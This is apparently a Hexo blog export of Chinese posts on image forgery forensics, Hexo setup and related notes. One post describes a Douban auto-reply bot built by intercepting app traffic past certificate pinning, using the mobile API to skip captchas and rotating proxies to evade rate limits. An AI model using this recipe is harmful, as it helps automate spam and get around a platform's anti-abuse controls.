<h3 id="PROPOSED-APPROACH-1"><a href="#PROPOSED-APPROACH-1" class="headerlink" title="PROPOSED APPROACH"></a>PROPOSED APPROACH</h3><blockquote>
<p>describe the proposed architecture and its training</p>
</blockquote>
<p>因为内部处理步骤，每个相机模型在每个获取的图像上留下了模型本身特有的许多<strong>伪像(sartifacts)<strong>，但是这些伪像很</strong>脆弱</strong>而且他们的利用需要<strong>极其复杂的统计方法</strong>，最经典的方法是借助于高通滤波器(high-pass filter)或去噪器(denoiser)提取图像的噪声残留(a noise residual)</p>
<blockquote>
<ol>
<li>improve the noise residual extraction process</li>
<li>enhance the camera model artifacts </li>
</ol>
</blockquote>
<ul>
<li><p>Extracting noiseprints</p>
<ul>
<li>输入：a generic image 通用图像</li>
<li>输出：a suitable noise residual </li>
</ul>
<p><img src="E:\hexo\source_posts\digital-images-forensic\extract-noiseprint.png" alt="1611720504128"></p>
<ul>
<li><p>denoiser</p>
<ul>
<li>删除或强烈衰减高级场景内容，这对于我们的目的而言是一种干扰</li>
<li>不是去生成无噪声版本，而是提取影响其的噪声模式（通过去除高级内容），最终将其从输入中减去以获得所需的清晰图像</li>
</ul>
<p><img src="E:\hexo\source_posts\digital-images-forensic\denoiser.png" alt="1611733547523"></p>
<ul>
<li>训练基于CNN的降噪器。输入：a noisy image patch；输出：its noise content</li>
</ul>
</li>
<li><p>原理：<strong>image patches coming from the same camera model should generate similar noiseprint patches</strong></p>
</li>
</ul>
</li>
<li><p>Implementation</p>
<ul>
<li>initialization</li>
<li>boosting minibatch information：$O(n^2)$</li>
<li>distance-based logistic loss</li>
<li>regularization</li>
</ul>
</li>
</ul>
<h3 id="EXPERIMENTAL-ANALYSIS"><a href="#EXPERIMENTAL-ANALYSIS" class="headerlink" title="EXPERIMENTAL ANALYSIS"></a>EXPERIMENTAL ANALYSIS</h3><blockquote>
<p>carry out a thorough comparative performance analysis of a noiseprint-based algorithm for forgery localization</p>
</blockquote>
<ul>
<li>forgery localization based on noiseprints<ul>
<li>输入：the image and its noiseprint</li>
<li>输出：a real-valued heatmap for each pixel</li>
<li>Splicebuster：通过采用图像噪声纹代替其中使用的三阶图像残差而获得的改善效果</li>
</ul>
</li>
<li>reference methods</li>
<li>datasets</li>
<li>performance measures</li>
<li>training procedure<ul>
<li>training训练 / validation验证 / test测试</li>
</ul>
</li>
<li>preliminary analyses</li>
</ul>
<h3 id="FURTHER-NOISEPRINT-BASED-FORENSIC-ANALYSES"><a href="#FURTHER-NOISEPRINT-BASED-FORENSIC-ANALYSES" class="headerlink" title="FURTHER NOISEPRINT-BASED FORENSIC ANALYSES"></a>FURTHER NOISEPRINT-BASED FORENSIC ANALYSES</h3><blockquote>
<p>provide ideas and examples on possible uses of noiseprints for further forensic tasks</p>
</blockquote>
<h3 id="CONCLUSIONS"><a href="#CONCLUSIONS" class="headerlink" title="CONCLUSIONS"></a>CONCLUSIONS</h3><hr>
<p>基本情况：两篇仔细阅读和整理完毕，代码找到，但未研究具体细节</p>
<h1 id="人工智能"><a href="#人工智能" class="headerlink" title="人工智能"></a>人工智能</h1><p>一个人工智能的诞生：<a href="https://jibencaozuo.com/">https://jibencaozuo.com/</a></p>
<hr>
<h1 id="汇报"><a href="#汇报" class="headerlink" title="汇报"></a>汇报</h1><h2 id="👼-FIRST"><a href="#👼-FIRST" class="headerlink" title="👼 FIRST"></a>👼 FIRST</h2><p>Media Forensics and DeepFakes</p>
<p>SECTION B通读，重点看<strong>106(老师没看)<strong>，</strong>107</strong>是如何提到的 **96(特征很复杂)**，整合自己的方案，探讨自己的问题，最后再用标准库测试</p>
<p><img src="E:\hexo\source_posts\digital-images-forensic\paper.png" alt="1611749784564"></p>
<p>blind scenario</p>
<p>传统的、盲方法(不需要先验知识)</p>
<p>基于有监督的机器学习，如SVM</p>
<p>聚类：kmeans(指定扩充的类别) / 自适应扩充的类别</p>
<p>理解工作、没有代码自己编、无需百分百重现、寻找亮点</p>
<p>难度和复杂度自己控制、最后要检测定位的目的</p>
<p>结合实际篡改取证的需求 + 精读文章 + 优化、组合、融合</p>
<p>假设图像来源 / 最有可能的篡改：缩放、边界融合、压缩</p>
<p>引用式的做对比</p>
<p>对比实验也很重要、子实验越多越好、越可信</p>
<p>注意一下三篇文献的<strong>去噪方法</strong>、做实验的时候看中间结果</p>
<p>最后的改进和创新都是从<strong>细节</strong>开始</p>
<p>两大类实验：基本库 / 稍微带点鲁棒性(对数据库整体进行后处理)</p>
<p><strong>1. 做什么 / 怎么做 2. 为什么做(整体方案/每个模块/细节参数设置)</strong></p>
<p>自己讲3篇具体算法 / 自己对为什么的理解、重点模块 / 自己的初步实验规划、系统图 / 细化 / PPT，多画图，多用图示</p>
<ul>
<li>【96】 D. Cozzolino, D. Gragnaniello, and L. V erdoliva, “Image forgery localization through the fusion of camera-based, feature-based and pixel-based techniques,” in IEEE International Conference on Image<br>Processing, 2014, pp. 5302–5306.</li>
<li>【106】 D. Cozzolino, F. Marra, G. Poggi, C. Sansone, and L. V erdoliva, “PRNU-based forgery localization in a blind scenario,” in International Conference on Image Analysis and Processing, 2017, pp. 569–579.<ul>
<li>见📕591页</li>
</ul>
</li>
<li>【107】 L. V erdoliva, D. Cozzolino, and G. Poggi, “A feature-based approach for image tampering detection and localization,” in IEEE International Workshop on Information F orensics and Security, 2014, pp. 149–154.</li>
</ul>
<hr>
<h2 id="🧨Image-forgery-localization-through-the-fusion-of-camera-based-feature-based-and-pixel-based-techniques"><a href="#🧨Image-forgery-localization-through-the-fusion-of-camera-based-feature-based-and-pixel-based-techniques" class="headerlink" title="🧨Image forgery localization through the fusion of camera-based, feature-based and pixel-based techniques"></a>🧨Image forgery localization through the fusion of camera-based, feature-based and pixel-based techniques</h2>]]></content>
      <tags>
        <tag>forensic</tag>
        <tag>cv</tag>
      </tags>
  </entry>
  <entry>
    <title>数字图像篡改取证整理</title>
    <url>/2021/04/03/digital-images-tampering-introduce/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>通过参考<a href="https://zhuanlan.zhihu.com/p/110093560">大佬的综述</a>，自我整理</p>
<blockquote>
<p>数字图像篡改的取证技术：在图像从成像设备产生之后，通过分析数字图像的特征来对图像进行真实性（内容是否真实）、完整性（是否经过篡改）以及其来源（来自哪个设备）进行鉴别。</p>
</blockquote>
<h2 id="篡改方式"><a href="#篡改方式" class="headerlink" title="篡改方式"></a>篡改方式</h2><table>
<thead>
<tr>
<th>篡改方式</th>
<th>英文</th>
<th>简介</th>
<th>应用</th>
</tr>
</thead>
<tbody><tr>
<td>合成</td>
<td>Composited</td>
<td></td>
<td>篡改图像内容</td>
</tr>
<tr>
<td>润饰</td>
<td>Re-touched</td>
<td></td>
<td>掩盖图像的篡改痕迹</td>
</tr>
<tr>
<td>计算机生成</td>
<td>Computer Generated</td>
<td></td>
<td>篡改图像内容</td>
</tr>
<tr>
<td>变种</td>
<td>morphed</td>
<td>把一幅图像逐渐变化成为另外一幅图像</td>
<td>篡改图像内容</td>
</tr>
<tr>
<td>增强</td>
<td>enhanced</td>
<td></td>
<td>掩盖图像的篡改痕迹</td>
</tr>
<tr>
<td>绘画</td>
<td>painted</td>
<td></td>
<td>篡改图像内容</td>
</tr>
<tr>
<td>二次获取图像</td>
<td>Rebroadcast</td>
<td></td>
<td>掩盖图像的篡改痕迹</td>
</tr>
<tr>
<td>携密图象</td>
<td>stego image</td>
<td></td>
<td>篡改图像内容</td>
</tr>
</tbody></table>
<h2 id="数字图像取证技术"><a href="#数字图像取证技术" class="headerlink" title="数字图像取证技术"></a>数字图像取证技术</h2><ul>
<li><p>主动取证：需要事先在图像中嵌入验证信息，然后再进行信息提取验证的相关技术手段</p>
<ul>
<li><p>数字水印</p>
<p><img src="digital-images-tampering-introduce/image-waterprint.jpg" alt="数字水印"></p>
</li>
<li><p>数字签名</p>
<p><img src="digital-images-tampering-introduce/image-signature.jpg" alt="数字签名"></p>
</li>
<li><p>缺点：嵌入水印可能会对图像造成影响；不能及时地对图像嵌入水印；可以自动添加水印的成像设备价格昂贵</p>
</li>
</ul>
</li>
<li><p>被动取证：直接从没有事先嵌入数字水印或签名的图像进行取证，依赖于取证图像本身</p>
<ul>
<li><a href="#%E5%9B%BE%E8%B1%A1%E6%9D%A5%E6%BA%90%E7%9A%84%E8%A2%AB%E5%8A%A8%E5%8F%96%E8%AF%81">图像溯源取证</a>：图像来源（计算机、扫描仪、数字相机、其他设备）</li>
<li><a href="#%E5%9B%BE%E5%83%8F%E5%86%85%E5%AE%B9%E7%9A%84%E8%A2%AB%E5%8A%A8%E5%8F%96%E8%AF%81">图像内容取证</a>：内容篡改鉴别<ul>
<li>复制粘贴：同一张图像的内部篡改操作</li>
<li>拼接</li>
<li>删除（移除）</li>
<li>其他</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="图象来源的被动取证"><a href="#图象来源的被动取证" class="headerlink" title="图象来源的被动取证"></a>图象来源的被动取证</h3><ul>
<li>不同的品牌和型号的设备具有特定的成像属性</li>
<li>设备的类型、品牌和型号完全相同，不同设备的个体差异也会导致不同图像具有不同的属性</li>
</ul>
<table>
<thead>
<tr>
<th>名称</th>
<th>算法</th>
</tr>
</thead>
<tbody><tr>
<td>模式噪声估计算法</td>
<td>预先建立数据集，相同型号设备拍摄的照片用去噪算法过滤出残余噪声作为该型号设备的参考噪声，用测试图片的残余噪声和之前的参考噪声对比，确定设备型号。</td>
</tr>
<tr>
<td>CFA 差值算法</td>
<td>不同的设备使用的插值算法和模型也不同。</td>
</tr>
<tr>
<td>光学镜头失真算法</td>
<td>光学镜头的失真引起图片几何特性变化，不同设备带来的几何变化不同。</td>
</tr>
<tr>
<td>JPEG 量化表算法</td>
<td>不同品牌的设备采用的 JPEG 量化表不同，只能判断图像的大致范围，无法准确确定成像设备的具体型号。</td>
</tr>
<tr>
<td>自然图像和计算机图形的鉴别</td>
<td>计算机生成的图像在细小纹理、光照、直方图连续性等统计特性上有很大的差异。</td>
</tr>
</tbody></table>
<h3 id="图像内容的被动取证"><a href="#图像内容的被动取证" class="headerlink" title="图像内容的被动取证"></a>图像内容的被动取证</h3><table>
<thead>
<tr>
<th>图像被动取证技术分类</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>图像克隆被动取证</td>
<td>图象中两个完全相同的区域</td>
</tr>
<tr>
<td>图像拼接被动取证</td>
<td>统计特性和边缘特征发生变化</td>
</tr>
<tr>
<td>重采样被动取证</td>
<td>重采样：对图像尺寸的缩放，通常采用插值算法来增加（上采样）或减少（下采样）图像像素，改变图像原有的统计特性</td>
</tr>
<tr>
<td>模糊被动取证</td>
<td>根据图像模糊操作滤波器的特性来进行判断，不同模糊方法其像素值之间往往有迹可循</td>
</tr>
<tr>
<td>光照不一致性被动取证</td>
<td>光源位置和阴影的几何形状</td>
</tr>
<tr>
<td>基于模式噪声被动取证</td>
<td>检测一幅图像中模式噪声不一致的区域，不同图像的噪声域不同</td>
</tr>
<tr>
<td>面向 JPEG 图像篡改的被动取证</td>
<td></td>
</tr>
<tr>
<td>基于深度学习的图像被动取证</td>
<td></td>
</tr>
</tbody></table>
<h4 id="基于传统方法的图像被动取证"><a href="#基于传统方法的图像被动取证" class="headerlink" title="基于传统方法的图像被动取证"></a>基于传统方法的图像被动取证</h4><p>没有出现一种方法可以应对所有的图像篡改技术，大多只能针对<strong>一类</strong>图像篡改方法。手工设计特征的方式进行特征提取，对该特征进行对比分析或者是图像的统计特性进行分析，找出篡改区域，判定篡改技术种类。缺点：基于手工设计的特征存在局限性和缺乏代表性，无法根据这些特征同时对多种篡改方式进行判定。</p>
<ol>
<li>基于篡改痕迹检测的图像被动取证：通过提取图像块的特征，比较不同块之间的特征相似度</li>
<li>基于成像设备固有属性一致性被动取证：比较不同图像的固有属性</li>
<li>基于图像内在统计特征被动取证</li>
</ol>
<h4 id="基于深度学习方法的图像被动取证"><a href="#基于深度学习方法的图像被动取证" class="headerlink" title="基于深度学习方法的图像被动取证"></a>基于深度学习方法的图像被动取证</h4><p>深度学习技术在计算机视觉领域有了很大的进展，在<strong>多种类</strong>篡改技术的识别方面取得了不错的效果，提供<strong>通用</strong>图像被动取证方法。</p>
<p>图像取证领域与计算机视觉领域有差别：</p>
<ul>
<li>深度学习模型一般用于语义内容识别，而图像被动取证领域需要识别篡改区域；</li>
<li>计算机视觉关注语义忽略图像内容间的细微变化，而图像篡改取证需要关注篡改边界的细微变化，根据边界伪影和统计特征的变化，判断图像真假；</li>
<li>后处理如压缩、模糊对内容的影响不大，但是使得篡改边界细微的变化大大影响。</li>
</ul>
<p>最重要的是，对<strong>篡改特征的提取</strong>而避免提取图像的语义内容特征。</p>
<p>两大任务：</p>
<ul>
<li>篡改技术识别</li>
<li>篡改区域定位：对虚假图像中的篡改区域进行定位，输出内容有两种方式<ul>
<li>bounding box 边框回归</li>
<li>篡改区域二进制掩码（mask）</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>forensic</tag>
      </tags>
  </entry>
  <entry>
    <title>豆瓣自动回贴机器人【我没有用来干坏事呀~】</title>
    <url>/2021/04/13/douban-robot/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>接到这个需求的起初，乱搜，尝试过：</p>
<ul>
<li><p><del>用别人封装好的 apk</del>（安装的时候说有不良信息，就没敢继续下去了）</p>
</li>
<li><p>用别人写好的油猴脚本，但是脚本是没有验证码的，所以在豆瓣网页端一个 id 只能连续回复两次，第三次的时候就需要填写验证码了，舍弃</p>
</li>
<li><p>上 GitHub 找别人开源项目，有些是加入了验证码的，但是没有跑起来。<del>原是我不配，菜狗</del></p>
</li>
<li><p>最终自己的参考：因为移动端发帖无需验证码，所以模拟移动端登录发贴过程，绕过填写验证码阶段</p>
<blockquote>
<p>一组：<a href="https://github.com/polymorphism-0/douban-auto-reply">https://github.com/polymorphism-0/douban-auto-reply</a></p>
<p>多组：<a href="https://github.com/gulico/DoubanBot">https://github.com/gulico/DoubanBot</a></p>
</blockquote>
</li>
</ul>
<blockquote>
<p>something to say<br>感恩开源大佬，此生永远为开源发电 🚀，GayHub 🐮🍺<br>豆瓣 gg，没有恶意，不用来干违法犯罪的事，只用来顶顶贴，我们小组会好好爱护豆瓣服务器，不要过于频繁地发送请求，如果违规触犯了什么，俺俺俺😐🤐，马上撤</p>
</blockquote>
<p>待实现的功能：（最近在写毕设，来不及改代码，等过完答辩先~）</p>
<ul>
<li><input disabled="" type="checkbox"> 按照帖子 topic 定制回复语</li>
<li><input disabled="" type="checkbox"> 回复 &lt; x 条的消息</li>
</ul>
<hr>
<h2 id="移动端抓包"><a href="#移动端抓包" class="headerlink" title="移动端抓包"></a>移动端抓包</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
<li>Windows 64</li>
<li>Android 10.0</li>
<li>Fiddler 4</li>
</ul>
<h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><ol>
<li><p>下载 fiddler 并且抓包</p>
<ul>
<li><a href="https://www.telerik.com/download/fiddler">下载地址</a>，需要科学上网，选择 Fiddler Classic，填入相关信息，选择 Download for Windows</li>
<li>参考：<a href="https://www.jianshu.com/p/724097741bdf">使用 fiddler 实现手机抓包</a><ul>
<li>注意『（2）为证书命名后点击确定』步骤：需要点击下载好的 cer 证书，然后安卓手机会提示使用以下方式打开，选择『证书安装器』即可，为证书命名随意</li>
<li>注意『（3）要求设置一个手机密码』步骤，在现在的安卓手机尝试指纹就可（依自己手机而随机应变）</li>
</ul>
</li>
</ul>
</li>
<li><p>Android 高于「7.0」 之后，移动端访问 HTTPS 的链接都无法连接成功，此时解决方法指路：<a href="https://blog.csdn.net/qq_36562656/article/details/109196342">fiddler 抓安卓 7.0 以上版本</a>，直接看第四步『使用兼容 Xposed 的框架 + JustTrustMe』</p>
<ul>
<li>注意被测应用选择<strong>豆瓣</strong>，就相当于在 VirtualXposed 软件中打开豆瓣，其中发送的数据流量包都会被 Fiddler 记录下来</li>
</ul>
</li>
</ol>
<h3 id="抓两种包"><a href="#抓两种包" class="headerlink" title="抓两种包"></a>抓两种包</h3><ol>
<li><p>打开 Fiddler，选择 File → Capture Traffic，如果是 ✔ 状态，则说明在抓包，再点一次就是停止抓包。</p>
</li>
<li><p>【登录包】在装包状态下，此时我们用 VirtualXposed 打开「豆瓣」，一定要用<strong>帐号密码登录</strong>，成功登录后，在 Fiddler 页面 ctrl + f 查找一个 URL 包含 <code>/service/auth2/token</code> 的包，如下图所示。</p>
<ul>
<li><p>User-Agent 信息</p>
<p>   <img src="1.png" alt="POST"></p>
</li>
<li><p>点击 WebForms 也有一些重要信息，我发现这个包里的密码都是明文的呜呜（码上加码</p>
<p>   <img src="6.png" alt="POST"></p>
<p>   注：其中只有 _sig 、_ts 字段会更新，而且要定期更换（意思就是定期重新操作一遍），不然 POST 请求会失效</p>
</li>
</ul>
</li>
<li><p>【抓刷新小组首页时的包】同理，我们继续访问小组首页，刷新成功后，在 Fiddler 页面 ctrl + f 查找一个 URL 包含「小组 id」的包（给我们的小组打上小码码），需要里面的 <strong>Authorization</strong></p>
<p> <img src="4.png" alt="Group-auth"></p>
</li>
</ol>
<h2 id="线上部署"><a href="#线上部署" class="headerlink" title="线上部署"></a>线上部署</h2><h3 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h3><ul>
<li>Ubuntu 18.04 server（非必须，可以先在自己的电脑尝试，如果是要不间断运行，则需要一个一直工作的服务器啦）</li>
<li>git</li>
</ul>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li><p>拉取 GitHub 的仓库 <code>git clone https://github.com/polymorphism-0/douban-auto-reply.git</code></p>
</li>
<li><p>进入工作目录 <code>cd douban-auto-reply</code>，输入 <code>vim config.py</code> 修改如下信息（都是抓包里的信息）：</p>
<ul>
<li>group_id</li>
<li>client_secret</li>
<li>authorization</li>
<li>headers 下的 “User-Agent”</li>
<li><code>device_info = &quot;os_rom=android&amp;apikey=0dad551ec0f84ed02907ff5c42e8ec70&amp;channel=Yingyongbao_Market&amp;udid=eef02070727bb25628886ac37a3d4575ea118ef5&amp;oaid=786bf7bf-7dd3-288c-df37-def2ffb817c6&amp;timezone=Asia%2FShanghai&quot;</code> 原文没有 oaid 和 timezone ，需要加上，否则可能会出现请求不完整，导致返回 400 错误。</li>
<li>group_topics_url 中的 _sig、_ts</li>
</ul>
</li>
<li><p>【启动 IP 代理池】改完后先跑 <code>python3 IPProxyPool/IPProxy.py</code> （需要一直在后台运行）</p>
</li>
<li><p>【运行主程序】再跑 <code>python3 autoreply.py</code></p>
</li>
<li><p>结果</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[2021-04-13 21:15:32] [INFO] Sleep <span class="keyword">for</span> 4 seconds</span><br><span class="line">[2021-04-13 21:15:36] [INFO] New proxy, &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://27.9.97.90:8118&#x27;</span>&#125;</span><br><span class="line">[2021-04-13 21:15:36] [INFO] 第1次刷新小组首页</span><br><span class="line">[2021-04-13 21:15:37] [INFO] comment: ค(TㅅT)ค, https://frodo.douban.com/api/v2/group/topic/22067****/create_comment, status_code: 200</span><br><span class="line">[2021-04-13 21:15:37] [INFO] 第1次回复</span><br><span class="line">[2021-04-13 21:15:37] [INFO] Sleep <span class="keyword">for</span> 18 seconds</span><br><span class="line">[2021-04-13 21:15:55] [INFO] 第2次刷新小组首页</span><br><span class="line">[2021-04-13 21:15:56] [INFO] comment: ｡･+ﾟﾟ(うд´｡)ﾟﾟ+･｡, https://frodo.douban.com/api/v2/group/topic/22071****/create_comment, status_code: 200</span><br><span class="line">[2021-04-13 21:15:56] [INFO] 第2次回复</span><br><span class="line">[2021-04-13 21:15:56] [INFO] Sleep <span class="keyword">for</span> 25 seconds</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <tags>
        <tag>playing</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/04/14/hello-world/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<a id="more"></a>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>hexo+github搭建博客</title>
    <url>/2020/03/21/hexo-github/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>Hexo是一个基于 Github Pages 的博客发布工具，支持Markdown格式，有众多优秀插件和主题<br>github：<a href="https://github.com/hexojs/hexo">https://github.com/hexojs/hexo</a><br>官网：<a href="http://hexo.io/">http://hexo.io</a></p>
</blockquote>
<a id="more"></a>

<h1 id="hexo-一些命令-amp-用法"><a href="#hexo-一些命令-amp-用法" class="headerlink" title="hexo 一些命令 &amp; 用法"></a>hexo 一些命令 &amp; 用法</h1><ul>
<li>一般下载的主题的位置位于<code>hexo/themes</code>，切换主题的时候需要修改<code>hexo/_config.yml</code>中的<code>theme</code></li>
<li>一般生成的文章的位置位于<code>hexo/source/_posts</code></li>
<li>所有的命令都在<code>git bash</code>下进行，一些<code>hexo</code>的命令<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># hexo generate 生成静态文件 </span><br><span class="line">hexo g</span><br><span class="line"># hexo server 启动服务，在本地预览</span><br><span class="line">hexo s </span><br><span class="line"># hexo deploy 部署网站</span><br><span class="line"># 上传到github，无需通过git add和git push，但需要配置</span><br><span class="line">hexo d</span><br><span class="line"># 新建文章</span><br><span class="line">hexo new &quot;name&quot;</span><br><span class="line"># 新建页面</span><br><span class="line">hexo new page &quot;pageName&quot; </span><br></pre></td></tr></table></figure></li>
<li>插入图片<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># hexo&#x2F;_config.yml </span><br><span class="line">post_asset_folder: true</span><br><span class="line"># hexo n 生成md博文时，&#x2F;source&#x2F;_posts文件夹内除了md文件还有一个同名的文件夹，不再赘述</span><br><span class="line"></span><br><span class="line"># 在hexo目录下，安装上传本地图片的插件，我装了会出错</span><br><span class="line">npm install hexo-asset-image --save</span><br><span class="line"># 卸载</span><br><span class="line">npm uninstall hexo-asset-image</span><br></pre></td></tr></table></figure></li>
<li><a href="https://github.com/theme-next/hexo-symbols-count-time/issues/53">The symbols count is undefined and reading time is NaN:aN</a></li>
</ul>
<h1 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h1><ul>
<li>部署到github上，通过hexo直接更新github仓库<br>如果要通过<code>hexo d</code>直接上传，需要配置<ul>
<li><code>ssh key</code></li>
<li>修改<code>hexo/_config.yml</code>中有关<code>deploy</code>的部分</li>
</ul>
 <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">git@github.com:purplezi/purplezi.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>

<ul>
<li>安装插件<code>npm install hexo-deployer-git --save</code></li>
</ul>
</li>
</ul>
<h1 id="其他主题"><a href="#其他主题" class="headerlink" title="其他主题"></a>其他主题</h1><blockquote>
<ol>
<li>Fluid，基于 Hexo 的一款 Material Design 风格的主题<br>github：<a href="https://github.com/fluid-dev/hexo-theme-fluid">https://github.com/fluid-dev/hexo-theme-fluid</a><br>官网：<a href="https://hexo.fluid-dev.com/docs">https://hexo.fluid-dev.com/docs</a><br>配置指南：<a href="https://hexo.fluid-dev.com/docs">https://hexo.fluid-dev.com/docs</a></li>
<li><a href="https://github.com/blinkfox/hexo-theme-matery">https://github.com/blinkfox/hexo-theme-matery</a></li>
<li><a href="https://github.com/litten/hexo-theme-yilia">https://github.com/litten/hexo-theme-yilia</a> 推荐用yilia-plus</li>
<li><a href="https://www.zhihu.com/question/24422335?utm_source=qq&amp;utm_medium=social&amp;utm_oi=868617446326681600">https://www.zhihu.com/question/24422335?utm_source=qq&amp;utm_medium=social&amp;utm_oi=868617446326681600</a></li>
<li><a href="http://ppoffice.github.io/hexo-theme-icarus">http://ppoffice.github.io/hexo-theme-icarus</a><br>dark mode change: <a href="https://blog.sbx0.cn/2020/04/07/icarus-3-night-mode/">https://blog.sbx0.cn/2020/04/07/icarus-3-night-mode/</a></li>
</ol>
</blockquote>
<ul>
<li>更换主题后出现文章的图片加载不出，找不到原因<ul>
<li>解决方法：对每篇文章进行微修改，就可以马上加载出来了</li>
</ul>
</li>
<li>如果是配置gitee的Gitee Pages，不是Pro，则需要手动到Gitee Pages上更新</li>
</ul>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://io-oi.me/tech/hexo-next-optimization/">hexo+Github超深度优化</a></li>
<li><a href="http://chant00.com/2015/11/04/%E5%9C%A8hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%EF%BC%8C%E9%9F%B3%E4%B9%90%EF%BC%8C%E8%A7%86%E5%B1%8F%EF%BC%8C%E5%85%AC%E5%BC%8F/">在hexo中加入图片、音频、视频</a></li>
</ul>
]]></content>
      <categories>
        <category>Blogs</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>github</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>icarus-一个hexo主题美化过程</title>
    <url>/2021/01/15/icarus/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
<li><p>添加背景</p>
<ul>
<li><code>hexo\themes\icarus\source\css</code>背景图片位于<code>hexo\themes\icarus\source\img</code><figure class="highlight styl"><table><tr><td class="code"><pre><span class="line">body</span><br><span class="line">background: url(/img/gallery/3.jpg) no-repeat;</span><br><span class="line"><span class="attribute">background-attachment</span>: fixed;</span><br><span class="line"><span class="attribute">background-size</span>: cover;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>调整背景透明度</p>
<ul>
<li><code>themes\icarus\source\js\animation.js</code></li>
</ul>
</li>
<li><p><a href="https://www.jianshu.com/p/2c2726da64a3?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation">在hexo博客中加入豆瓣读书功能</a></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>IP地址</title>
    <url>/2020/07/20/ipaddress/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>localhost、127.0.0.1、0.0.0.0、本机IP的区别</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/72988255">https://zhuanlan.zhihu.com/p/72988255</a></li>
<li><a href="https://www.cnblogs.com/operationhome/p/8681475.html">https://www.cnblogs.com/operationhome/p/8681475.html</a></li>
<li><a href="https://www.jianshu.com/p/ad7cd1d5be45">https://www.jianshu.com/p/ad7cd1d5be45</a></li>
</ul>
]]></content>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>The road to the Spider Man!!</title>
    <url>/2021/03/10/spider/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
<li>动态页面的爬取</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>白帽子讲web安全</title>
    <url>/2021/01/11/web-notes/</url>
